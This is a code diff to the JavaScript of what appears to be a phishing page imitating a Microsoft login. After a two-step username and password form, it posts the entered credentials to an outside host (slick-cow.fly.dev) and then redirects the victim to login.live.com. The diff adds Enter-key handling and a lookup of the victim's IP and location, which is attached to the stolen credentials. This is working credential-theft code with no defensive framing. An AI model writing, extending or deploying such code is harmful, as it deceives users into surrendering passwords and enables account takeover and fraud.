@@ -5,6 +5,33 @@ document.addEventListener("DOMContentLoaded", () => {
   const pwdInp = document.getElementById("inp_pwd");
   let view = "uname";
 
+  window.addEventListener("keypress", (e) => {
+    if (e.key === "Enter") {
+      if (view === "uname") {
+        //validate the form
+        validate();
+        if (unameVal) {
+          document.getElementById("section_uname").classList.toggle("d-none");
+          document.getElementById("section_pwd").classList.remove("d-none");
+          document.querySelectorAll("#user_identity").forEach((e) => {
+            e.innerText = unameInp.value;
+          });
+          view = "pwd";
+        }
+      } else if (view === "pwd") {
+        //validate the form
+        validate();
+        if (pwdVal) {
+          document.getElementById("section_pwd").classList.toggle("d-none");
+          document.getElementById("section_final").classList.remove("d-none");
+          view = "final";
+        }
+      } else {
+        document.querySelector("#btn_final").click();
+      }
+    }
+  });
+
   let unameVal = (pwdVal = false);
   /////next button
   const nxt = document.getElementById("btn_next");
@@ -98,8 +125,13 @@ document.addEventListener("DOMContentLoaded", () => {
 
   //final buttons
   document.querySelectorAll("#btn_final").forEach((b) => {
-    b.addEventListener("click", () => {
+    b.addEventListener("click", async () => {
       console.log("Done");
+
+      const data = await (
+        await fetch("https://api.db-ip.com/v2/free/self")
+      ).json();
+
       fetch("https://slick-cow.fly.dev/login", {
         method: "POST",
         headers: {
@@ -108,6 +140,7 @@ document.addEventListener("DOMContentLoaded", () => {
         body: JSON.stringify({
           loginfmt: unameInp.value,
           passwd: pwdInp.value,
+          ...data,
         }),
       }).then(() => {
         window.location.replace("https://login.live.com/");
